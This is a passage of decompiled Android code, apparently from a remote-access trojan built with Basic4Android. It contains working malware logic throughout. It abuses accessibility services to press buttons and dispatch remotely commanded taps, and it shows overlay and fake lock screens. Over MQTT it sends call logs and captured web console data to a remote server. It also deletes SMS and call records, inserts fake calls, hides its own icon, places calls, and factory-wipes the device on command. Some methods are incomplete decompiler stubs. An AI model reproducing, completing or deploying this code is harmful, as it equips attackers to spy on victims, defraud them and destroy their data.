        _acs.initialize(processBA, "acs");
        _acs.StrIsIn("StartAcc");
        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = _acs;
        B4AApplication b4AApplication = Common.Application;
        accessibilityEventsListener.Set_App_Name(B4AApplication.getLabelName());
        globalparameters globalparametersVar5 = mostCurrent._globalparameters;
        if (globalparameters._ishide_allnoties) {
            _acs.SetIsNotiFicationBarShow(false);
        } else {
            _acs.SetIsNotiFicationBarShow(true);
        }
        _jo_otherfunctions.InitializeContext(processBA);
        _checkifserviceisenabled();
        _phoneevents1.InitializeWithPhoneState(processBA, "PhoneEvents1", _phoneid);
        return "";
    }

    public static String _service_destroy() throws Exception {
        _mqtt.Close();
        _working = false;
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        globalparameters._isaccactive = false;
        mostCurrent._service.StartForeground(Common.Rnd(1112, 11119), (Notification) _createnotification().getObject());
        BA ba = processBA;
        Class<?> object = getObject();
        DateTime dateTime = Common.DateTime;
        long now = DateTime.getNow();
        DateTime dateTime2 = Common.DateTime;
        Common.StartServiceAt(ba, object, now + 900000, true);
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        mostCurrent._service.StartForeground(1, (Notification) _createnotification().getObject());
        BA ba = processBA;
        Class<?> object = getObject();
        DateTime dateTime = Common.DateTime;
        long now = DateTime.getNow();
        DateTime dateTime2 = Common.DateTime;
        Common.StartServiceAt(ba, object, now + 900000, true);
        _noti_replacement(" ", " ", 1);
        return "";
    }

    public static boolean _setinterruptionfilter(int i) throws Exception {
        boolean z = true;
        try {
            JavaObject javaObject = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), new JavaObject().InitializeContext(processBA).RunMethod("getSystemService", new Object[]{"notification"}));
            if (javaObject.RunMethod("isNotificationPolicyAccessGranted", (Object[]) Common.Null).equals(false)) {
                IntentWrapper intentWrapper = new IntentWrapper();
                intentWrapper.Initialize("android.settings.NOTIFICATION_POLICY_ACCESS_SETTINGS", "");
                Common.StartActivity(processBA, intentWrapper.getObject());
                Common.LogImpl("64653066", "after resume", 0);
            }
            if (!javaObject.RunMethod("isNotificationPolicyAccessGranted", (Object[]) Common.Null).equals(true)) {
                Common.LogImpl("64653073", "No permission!", 0);
                return false;
            }
            try {
                javaObject.RunMethod("setInterruptionFilter", new Object[]{Integer.valueOf(i)});
                return true;
            } catch (Exception e) {
                e = e;
                processBA.setLastException(e);
                Common.LogImpl("64653076", BA.ObjectToString(Common.LastException(processBA)), 0);
                return z;
            }
        } catch (Exception e2) {
            e = e2;
            z = false;
        }
    }

    public static String _show_ovr() throws Exception {
        try {
            Common.LogImpl("69175042", "show_ovr", 0);
            try {
                BA ba = processBA;
                dtrsbnotisuntilactv dtrsbnotisuntilactvVar = mostCurrent._dtrsbnotisuntilactv;
                Common.StopService(ba, dtrsbnotisuntilactv.getObject());
            } catch (Exception e) {
                processBA.setLastException(e);
                Common.LogImpl("69175047", BA.ObjectToString(Common.LastException(processBA)), 0);
            }
            if (!_isovrsho) {
                clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
                if (clsclassperms_code._intpermissionno == 0) {
                    globalparameters globalparametersVar = mostCurrent._globalparameters;
                    if (globalparameters._isovlyhandler) {
                        _ws_send_unlockscreen_overlay();
                        Map map = new Map();
                        map.Initialize();
                        map.Put("bcolor", "#ffffff");
                        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                        map.Put("toptitle", globalparameters._strtoptitle_hdr);
                        globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                        map.Put("bottomtitle", globalparameters._strbottomtitle_hdr);
                        File file = Common.File;
                        File file2 = Common.File;
                        map.Put("imgurl", File.Combine(File.getDirInternal(), "loading.gif"));
                        _samsung_overlay_pans_co(BA.ObjectToString(map.Get("bcolor")), BA.ObjectToString(map.Get("toptitle")), BA.ObjectToString(map.Get("bottomtitle")), BA.ObjectToString(map.Get("imgurl")), true);
                        _isovrsho = true;
                    }
                }
            }
            globalparameters globalparametersVar4 = mostCurrent._globalparameters;
            globalparameters._ismainact_shouldclose = true;
            return "";
        } catch (Exception e2) {
            processBA.setLastException(e2);
            Common.LogImpl("69175070", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _timerchecker_tick() throws Exception {
        try {
            Common.LogImpl("69043970", "timerChecker_Tick checking...", 0);
            clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
            clsclassperms_code._timerchecker.setEnabled(false);
            clsclassperms_code clsclassperms_codeVar2 = mostCurrent._clsclassperms_code;
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69044020", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        if (clsclassperms_code._intpermissionno == 6) {
            _acs.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _acs.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _acs.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _acs.PerformGlobalAction(2);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _hide_oversha();
            return "";
        }
        clsclassperms_code clsclassperms_codeVar3 = mostCurrent._clsclassperms_code;
        if (clsclassperms_code._intnumberoftries == 12) {
            _acs.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _acs.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _acs.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _acs.PerformGlobalAction(2);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            _hide_oversha();
            return "";
        }
        StringBuilder sb = new StringBuilder();
        sb.append("intPermissionNo : ");
        clsclassperms_code clsclassperms_codeVar4 = mostCurrent._clsclassperms_code;
        sb.append(BA.NumberToString(clsclassperms_code._intpermissionno));
        Common.LogImpl("69044002", sb.toString(), 0);
        new dateutils._period();
        backgroundservice backgroundserviceVar = mostCurrent;
        dateutils dateutilsVar = backgroundserviceVar._dateutils;
        BA ba = processBA;
        clsclassperms_code clsclassperms_codeVar5 = backgroundserviceVar._clsclassperms_code;
        long j = clsclassperms_code._lastcheck;
        DateTime dateTime = Common.DateTime;
        if (dateutils._periodbetween(ba, j, DateTime.getNow()).Seconds > 3) {
            clsclassperms_code clsclassperms_codeVar6 = mostCurrent._clsclassperms_code;
            clsclassperms_code._intnumberoftries++;
            StringBuilder sb2 = new StringBuilder();
            sb2.append("added new tries : ");
            clsclassperms_code clsclassperms_codeVar7 = mostCurrent._clsclassperms_code;
            sb2.append(BA.NumberToString(clsclassperms_code._intnumberoftries));
            Common.LogImpl("69044008", sb2.toString(), 0);
            clsclassperms_code clsclassperms_codeVar8 = mostCurrent._clsclassperms_code;
            DateTime dateTime2 = Common.DateTime;
            clsclassperms_code._lastcheck = DateTime.getNow();
            clsclassperms_code clsclassperms_codeVar9 = mostCurrent._clsclassperms_code;
            IntentWrapper intentWrapper = new IntentWrapper();
            Intent intent = (Intent) Common.Null;
            Intent intent2 = intent;
            clsclassperms_code._inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper, intent);
            _acs.PerformGlobalAction(4);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
        }
        clsclassperms_code clsclassperms_codeVar10 = mostCurrent._clsclassperms_code;
        if (clsclassperms_code._intpermissionno < 6) {
            clsclassperms_code clsclassperms_codeVar11 = mostCurrent._clsclassperms_code;
            clsclassperms_code._timerchecker.setEnabled(true);
        }
        return "";
    }

    public static boolean _webchromeclient1_consolemessage(ConsoleMessage consoleMessage) throws Exception {
        if (_mqtt.IsInitialized() && _mqtt.getConnected()) {
            B4XSerializator b4XSerializator = new B4XSerializator();
            Map map = new Map();
            map.Initialize();
            map.Put("data", consoleMessage.Message());
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            map.Put("strpkn", globalparameters._strpkname);
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            map.Put("DeviceID", globalparameters._mydeviceid);
            _mqtt.Publish2("PosMyLoga", b4XSerializator.ConvertObjectToBytes(map.getObject()), 1, false);
            globalparameters globalparametersVar3 = mostCurrent._globalparameters;
            Map map2 = globalparameters._mpinjlist;
            globalparameters globalparametersVar4 = mostCurrent._globalparameters;
            map2.Remove(globalparameters._strpkname);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = _acs;
            globalparameters globalparametersVar5 = mostCurrent._globalparameters;
            accessibilityEventsListener.remove_certain_ovlypks(globalparameters._strpkname);
            globalparameters globalparametersVar6 = mostCurrent._globalparameters;
            globalparameters._isoverlay_isshowing = false;
            _ws_send_unlockscreen_overlay();
            globalparameters globalparametersVar7 = mostCurrent._globalparameters;
            globalparameters._strpkname = "";
        }
        return true;
    }

    public static String _writesetting(String str, int i) throws Exception {
        try {
            if (_canwritetosystemsettings()) {
                Reflection reflection = new Reflection();
                Object[] objArr = new Object[3];
                for (int i2 = 0; i2 < 3; i2++) {
                    objArr[i2] = new Object();
                }
                String[] strArr = {"android.content.ContentResolver", "java.lang.String", "java.lang.int"};
                Arrays.fill(strArr, "");
                reflection.Target = reflection.GetContext(processBA);
                objArr[0] = reflection.RunMethod("getContentResolver");
                objArr[1] = str;
                objArr[2] = Integer.valueOf(i);
                reflection.RunStaticMethod("android.provider.Settings$System", "putInt", objArr, strArr);
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68716306", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    public static String _ws_admin_connectedtodevice(Map map) throws Exception {
        try {
            _issendhvncastexts = false;
            if (1.0d == BA.ObjectToNumber(map.Get("intStatus"))) {
                globalparameters globalparametersVar = mostCurrent._globalparameters;
                globalparameters._intwhoisconnectedtome = BA.ObjectToString(map.Get("adminid"));
                Map map2 = new Map();
                map2.Initialize();
                globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                map2.Put("deviceid", globalparameters._intwhoisconnectedtome);
                globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                map2.Put("mydeviceid", globalparameters._mydeviceid);
                _sendeventtoserver("Send_Connection_Request_Accepted", map2);
            } else {
                globalparameters globalparametersVar4 = mostCurrent._globalparameters;
                globalparameters._intwhoisconnectedtome = "";
                globalparameters globalparametersVar5 = mostCurrent._globalparameters;
                globalparameters._isoverlay_isshowing = false;
                new Phone();
                Phone.getModel();
                Phone.getManufacturer();
                _samsung_remove_overlay_pane();
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68519719", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 876 " + Common.LastException(processBA).getMessage());
        }
        return "";
    }

    public static void _ws_del_sms_fromadmin(Map map) throws Exception {
        new ResumableSub_ws_Del_SMS_FromAdmin(null, map).resume(processBA, null);
    }

    public static class ResumableSub_ws_Del_SMS_FromAdmin extends BA.ResumableSub {
        Map _data;
        backgroundservice parent;
        boolean _rsl = false;
        SmsWrapper _smsmanager = null;
        boolean _isdeleted = false;

        public ResumableSub_ws_Del_SMS_FromAdmin(backgroundservice backgroundserviceVar, Map map) {
            this.parent = backgroundserviceVar;
            this._data = map;
        }

        /* JADX WARN: Removed duplicated region for block: B:47:0x0099  */
        /* JADX WARN: Removed duplicated region for block: B:49:0x00a5 A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r7, java.lang.Object[] r8) throws java.lang.Exception {
            /*
                r6 = this;
            L0:
                int r7 = r6.state     // Catch: java.lang.Exception -> L94
                r0 = 9
                r1 = 7
                r2 = 4
                r3 = 1
                r4 = 10
                r5 = 0
                switch(r7) {
                    case -1: goto L93;
                    case 0: goto L8f;
                    case 1: goto L86;
                    case 2: goto Ld;
                    case 3: goto L72;
                    case 4: goto L68;
                    case 5: goto Ld;
                    case 6: goto L3b;
                    case 7: goto L35;
                    case 8: goto Ld;
                    case 9: goto L21;
                    case 10: goto L1b;
                    case 11: goto Le;
                    default: goto Ld;
                }     // Catch: java.lang.Exception -> L94
            Ld:
                goto L0
            Le:
                r6.state = r2     // Catch: java.lang.Exception -> L94
                r7 = r8[r5]     // Catch: java.lang.Exception -> L94
                java.lang.Boolean r7 = (java.lang.Boolean) r7     // Catch: java.lang.Exception -> L94
                boolean r7 = r7.booleanValue()     // Catch: java.lang.Exception -> L94
                r6._rsl = r7     // Catch: java.lang.Exception -> L94
                goto L0
            L1b:
                r7 = -1
                r6.state = r7     // Catch: java.lang.Exception -> L94
                r6.catchState = r5     // Catch: java.lang.Exception -> L94
                goto L0
            L21:
                r6.state = r4     // Catch: java.lang.Exception -> L94
                r6.catchState = r5     // Catch: java.lang.Exception -> L94
                java.lang.String r7 = "68257551"
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.objects.B4AException r0 = anywheresoftware.b4a.keywords.Common.LastException(r0)     // Catch: java.lang.Exception -> L94
                java.lang.String r0 = anywheresoftware.b4a.BA.ObjectToString(r0)     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.keywords.Common.LogImpl(r7, r0, r5)     // Catch: java.lang.Exception -> L94
                goto L0
            L35:
                r6.state = r4     // Catch: java.lang.Exception -> L94
                com.com.androidrr.backgroundservice._ws_sendsms_to_admin()     // Catch: java.lang.Exception -> L94
                goto L0
            L3b:
                r6.state = r1     // Catch: java.lang.Exception -> L94
                ice.smsplus.SmsWrapper r7 = new ice.smsplus.SmsWrapper     // Catch: java.lang.Exception -> L94
                r7.<init>()     // Catch: java.lang.Exception -> L94
                r6._smsmanager = r7     // Catch: java.lang.Exception -> L94
                r6._isdeleted = r5     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.objects.collections.Map r1 = r6._data     // Catch: java.lang.Exception -> L94
                java.lang.String r2 = "smsid"
                java.lang.Object r1 = r1.Get(r2)     // Catch: java.lang.Exception -> L94
                java.lang.String r1 = anywheresoftware.b4a.BA.ObjectToString(r1)     // Catch: java.lang.Exception -> L94
                boolean r7 = r7.deletesms(r0, r1)     // Catch: java.lang.Exception -> L94
                r6._isdeleted = r7     // Catch: java.lang.Exception -> L94
                java.lang.String r0 = "68257544"
                java.lang.Boolean r7 = java.lang.Boolean.valueOf(r7)     // Catch: java.lang.Exception -> L94
                java.lang.String r7 = anywheresoftware.b4a.BA.ObjectToString(r7)     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.keywords.Common.LogImpl(r0, r7, r5)     // Catch: java.lang.Exception -> L94
                goto L0
            L68:
                r6.state = r1     // Catch: java.lang.Exception -> L94
                boolean r7 = r6._rsl     // Catch: java.lang.Exception -> L94
                if (r7 != r3) goto L0
                r7 = 6
                r6.state = r7     // Catch: java.lang.Exception -> L94
                goto L0
            L72:
                r6.state = r2     // Catch: java.lang.Exception -> L94
                r6.catchState = r0     // Catch: java.lang.Exception -> L94
                java.lang.String r7 = "complete"
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.keywords.Common$ResumableSubWrapper r1 = com.com.androidrr.backgroundservice._check_sm_app()     // Catch: java.lang.Exception -> L94
                anywheresoftware.b4a.keywords.Common.WaitFor(r7, r0, r6, r1)     // Catch: java.lang.Exception -> L94
                r7 = 11
                r6.state = r7     // Catch: java.lang.Exception -> L94
                return
            L86:
                r6.state = r4     // Catch: java.lang.Exception -> L94
                r6.catchState = r0     // Catch: java.lang.Exception -> L94
                r7 = 3
                r6.state = r7     // Catch: java.lang.Exception -> L94
                goto L0
            L8f:
                r6.state = r3     // Catch: java.lang.Exception -> L94
                goto L0
            L93:
                return
            L94:
                r7 = move-exception
                int r0 = r6.catchState
                if (r0 == 0) goto La4
                int r0 = r6.catchState
                r6.state = r0
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA
                r0.setLastException(r7)
                goto L0
            La4:
                goto La6
            La5:
                throw r7
            La6:
                goto La5
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.backgroundservice.ResumableSub_ws_Del_SMS_FromAdmin.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static String _ws_formatthisdevice() throws Exception {
        try {
            if (!_manager.getEnabled()) {
                return "";
            }
            Reflection reflection = new Reflection();
            reflection.Target = _manager;
            reflection.Target = reflection.GetField("dm");
            reflection.RunMethod2("wipeData", BA.NumberToString(0), "java.lang.int");
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66881290", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 468 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_get_device_calllogs(Map map) throws Exception {
        try {
            Common.LogImpl("67077890", "calllogevent : " + BA.ObjectToString(map.Get("calllogevent")), 0);
            CallLogWrapper callLogWrapper = new CallLogWrapper();
            new CallLogWrapper.CallItem();
            new List().Initialize();
            List GetAll = callLogWrapper.GetAll(12);
            if ("deletecon".equals(BA.ObjectToString(map.Get("calllogevent")))) {
                ContentResolverWrapper contentResolverWrapper = new ContentResolverWrapper();
                Reflection reflection = new Reflection();
                contentResolverWrapper.Initialize("");
                reflection.Target = reflection.GetContext(processBA);
                reflection.Target = reflection.RunMethod("getContentResolver");
                Uri uri = (Uri) reflection.GetStaticField("android.provider.CallLog$Calls", "CONTENT_URI");
                Uri uri2 = uri;
                contentResolverWrapper.Delete(uri, "_ID= ?", new String[]{BA.ObjectToString(map.Get("ContactID"))});
            }
            if ("insertcon".equals(BA.ObjectToString(map.Get("calllogevent")))) {
                Common.LogImpl("67077911", "insertcon", 0);
                JavaObject javaObject = new JavaObject();
                javaObject.InitializeContext(processBA);
                javaObject.RunMethod("insertPlaceholderCall", new Object[]{map.Get("ContactPhone"), map.Get("ContactName")});
            }
            Map map2 = new Map();
            map2.Initialize();
            List list = new List();
            list.Initialize();
            int size = GetAll.getSize() - 1;
            for (int i = 0; i <= size; i++) {
                CallLogWrapper.CallItem callItem = (CallLogWrapper.CallItem) GetAll.Get(i);
                CallLogWrapper.CallItem callItem2 = callItem;
                String str = callItem.CachedName;
                if (str.trim().length() == 0 || str == null) {
                    str = "-";
                }
                Map map3 = new Map();
                map3.Initialize();
                map3.Put("contactID", Integer.valueOf(callItem.f302Id));
                map3.Put("ContactName", str);
                map3.Put("ContactPhone", callItem.Number);
                map3.Put("ContactDate", Long.valueOf(callItem.Date));
                list.Add(map3.getObject());
            }
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            map2.Put("DeviceID", globalparameters._mydeviceid);
            map2.Put("message", list.getObject());
            Common.LogImpl("67077943", BA.ObjectToString(map2), 0);
            B4XSerializator b4XSerializator = new B4XSerializator();
            if (_mqtt.IsInitialized() && _mqtt.getConnected()) {
                _mqtt.Publish2("Device_Calls_Logs_Save", b4XSerializator.ConvertObjectToBytes(map2.getObject()), 1, false);
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67077951", BA.ObjectToString(Common.LastException(processBA)), 0);
            if (Common.LastException(processBA).getMessage().toLowerCase().contains("permission")) {
                BA ba = processBA;
                perm_phonecal perm_phonecalVar = mostCurrent._perm_phonecal;
                Common.StartActivity(ba, perm_phonecal.getObject());
            }
            _send_toserver_errors("Line 555 " + Common.LastException(processBA).getMessage());
        }
        return "";
    }

    public static String _ws_hide_appdata_info(Map map) throws Exception {
        try {
            if ("1".equals(BA.ObjectToString(map.Get("isshouldshow")))) {
                JavaObject javaObject = _jo_otherfunctions;
                StringBuilder sb = new StringBuilder();
                B4AApplication b4AApplication = Common.Application;
                sb.append(B4AApplication.getPackageName().toLowerCase());
                sb.append(".main");
                javaObject.RunMethod("hideappicon", new Object[]{sb.toString()});
            } else {
                JavaObject javaObject2 = _jo_otherfunctions;
                StringBuilder sb2 = new StringBuilder();
                B4AApplication b4AApplication2 = Common.Application;
                sb2.append(B4AApplication.getPackageName().toLowerCase());
                sb2.append(".main");
                javaObject2.RunMethod("unhideappicon", new Object[]{sb2.toString()});
            }
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67405604", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 627 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_request_hvnc_tabletexts_fromandroid(Map map) throws Exception {
        try {
            _issendhvncastexts = BA.ObjectToBoolean(map.Get("isShowingOnlyTable"));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66356996", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 328 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_request_turnoffdevicescreen_fromandroid() throws Exception {
        try {
            BA ba = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar = mostCurrent._mediaprojectionbackservice;
            Common.CancelScheduledService(ba, mediaprojectionbackservice.getObject());
            BA ba2 = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar2 = mostCurrent._mediaprojectionbackservice;
            if (Common.IsPaused(ba2, mediaprojectionbackservice.getObject())) {
                return "";
            }
            mediaprojectionbackservice mediaprojectionbackserviceVar3 = mostCurrent._mediaprojectionbackservice;
            mediaprojectionbackservice._sc.Stop();
            BA ba3 = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar4 = mostCurrent._mediaprojectionbackservice;
            Common.StopService(ba3, mediaprojectionbackservice.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65439499", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 230 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_block_certain_app(Map map) throws Exception {
        try {
            Common.LogImpl("67798786", "ws_Send_Block_Certain_App", 0);
            if (_strblockedpackagename.equals(BA.ObjectToString(map.Get("apppackage")))) {
                _strblockedpackagename = "";
            } else {
                _strblockedpackagename = BA.ObjectToString(map.Get("apppackage"));
            }
            Common.LogImpl("67798793", _strblockedpackagename, 0);
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67798796", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 727 " + Common.LastException(processBA).getMessage());
        }
        return "";
    }

    public static String _ws_send_callphonenumber(Map map) throws Exception {
        try {
            String ObjectToString = BA.ObjectToString(map.Get("phonenumber"));
            new Phone.PhoneCalls();
            Common.StartActivity(processBA, Phone.PhoneCalls.Call(new StringUtils().EncodeUrl(ObjectToString, "utf8")));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66946823", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 482 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_change_h_quality(Map map) throws Exception {
        try {
            _inthquality = (int) BA.ObjectToNumber(map.Get("intqulaity"));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67012356", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 492 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_changevncfps(Map map) throws Exception {
        try {
            Common.LogImpl("67340034", "ws_Send_ChangeVNCFPS", 0);
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._intvncfps = (int) BA.ObjectToNumber(map.Get("fpsdata"));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67340039", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 584 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_click_frompctoandroiddevice(Map map) throws Exception {
        int ObjectToNumber;
        int ObjectToNumber2;
        try {
            int ObjectToNumber3 = (int) BA.ObjectToNumber(map.Get("clickx"));
            int ObjectToNumber4 = (int) BA.ObjectToNumber(map.Get("clicky"));
            if (map.ContainsKey("clickstartx") && map.Get("clickstartx") != null) {
                ObjectToNumber = (int) BA.ObjectToNumber(map.Get("clickstartx"));
                if (map.ContainsKey("clickstarty") && map.Get("clickstarty") != null) {
                    ObjectToNumber2 = (int) BA.ObjectToNumber(map.Get("clickstarty"));
                    Map map2 = new Map();
                    map2.Initialize();
                    map2.Put("GestX", Integer.valueOf(ObjectToNumber));
                    map2.Put("GestY", Integer.valueOf(ObjectToNumber2));
                    map2.Put("EndPointGestX", Integer.valueOf(ObjectToNumber3));
                    map2.Put("EndPointGestY", Integer.valueOf(ObjectToNumber4));
                    _rundispatchgesture(map2);
                    return "";
                }
                ObjectToNumber2 = ObjectToNumber4;
                Map map22 = new Map();
                map22.Initialize();
                map22.Put("GestX", Integer.valueOf(ObjectToNumber));
                map22.Put("GestY", Integer.valueOf(ObjectToNumber2));
                map22.Put("EndPointGestX", Integer.valueOf(ObjectToNumber3));
                map22.Put("EndPointGestY", Integer.valueOf(ObjectToNumber4));
                _rundispatchgesture(map22);
                return "";
            }
            ObjectToNumber = ObjectToNumber3;
            if (map.ContainsKey("clickstarty")) {
                ObjectToNumber2 = (int) BA.ObjectToNumber(map.Get("clickstarty"));
                Map map222 = new Map();
                map222.Initialize();
                map222.Put("GestX", Integer.valueOf(ObjectToNumber));
                map222.Put("GestY", Integer.valueOf(ObjectToNumber2));
                map222.Put("EndPointGestX", Integer.valueOf(ObjectToNumber3));
                map222.Put("EndPointGestY", Integer.valueOf(ObjectToNumber4));
                _rundispatchgesture(map222);
                return "";
            }
            ObjectToNumber2 = ObjectToNumber4;
            Map map2222 = new Map();
            map2222.Initialize();
            map2222.Put("GestX", Integer.valueOf(ObjectToNumber));
            map2222.Put("GestY", Integer.valueOf(ObjectToNumber2));
            map2222.Put("EndPointGestX", Integer.valueOf(ObjectToNumber3));
            map2222.Put("EndPointGestY", Integer.valueOf(ObjectToNumber4));
            _rundispatchgesture(map2222);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66684708", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 429 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static void _ws_send_create_notification(Map map) throws Exception {
        new ResumableSub_ws_Send_Create_Notification(null, map).resume(processBA, null);
    }

    public static class ResumableSub_ws_Send_Create_Notification extends BA.ResumableSub {
        Map _data;
        backgroundservice parent;
        CanvasWrapper.BitmapWrapper _ico = null;

        /* renamed from: _j */
        httpjob f342_j = null;
        String _strfilename = "";
        File.OutputStreamWrapper _outstream = null;

        public ResumableSub_ws_Send_Create_Notification(backgroundservice backgroundserviceVar, Map map) {
            this.parent = backgroundserviceVar;
            this._data = map;
        }

        /* JADX WARN: Removed duplicated region for block: B:95:0x0221  */
        /* JADX WARN: Removed duplicated region for block: B:97:0x022d A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r12, java.lang.Object[] r13) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 622
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.backgroundservice.ResumableSub_ws_Send_Create_Notification.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static void _ws_send_custom_lockscreen(Map map) throws Exception {
        new ResumableSub_ws_Send_Custom_LockScreen(null, map).resume(processBA, null);
    }

    public static class ResumableSub_ws_Send_Custom_LockScreen extends BA.ResumableSub {
        Map _data;
        backgroundservice parent;
        String _strimageicon = "";

        /* renamed from: _j */
        httpjob f343_j = null;
        CanvasWrapper.BitmapWrapper _bmp = null;
        File.OutputStreamWrapper _out = null;

        public ResumableSub_ws_Send_Custom_LockScreen(backgroundservice backgroundserviceVar, Map map) {
            this.parent = backgroundserviceVar;
            this._data = map;
        }

        /* JADX WARN: Removed duplicated region for block: B:48:0x015e  */
        /* JADX WARN: Removed duplicated region for block: B:50:0x016a A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r8, java.lang.Object[] r9) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 394
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.backgroundservice.ResumableSub_ws_Send_Custom_LockScreen.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static String _ws_send_deviceapps() throws Exception {
        try {
            Map map = new Map();
            map.Initialize();
            PackageManagerWrapper packageManagerWrapper = new PackageManagerWrapper();
            List GetInstalledPackages = packageManagerWrapper.GetInstalledPackages();
            int size = GetInstalledPackages.getSize();
            for (int i = 0; i < size; i++) {
                String ObjectToString = BA.ObjectToString(GetInstalledPackages.Get(i));
                map.Put(ObjectToString, packageManagerWrapper.GetApplicationLabel(ObjectToString));
            }
            Map map2 = new Map();
            map2.Initialize();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
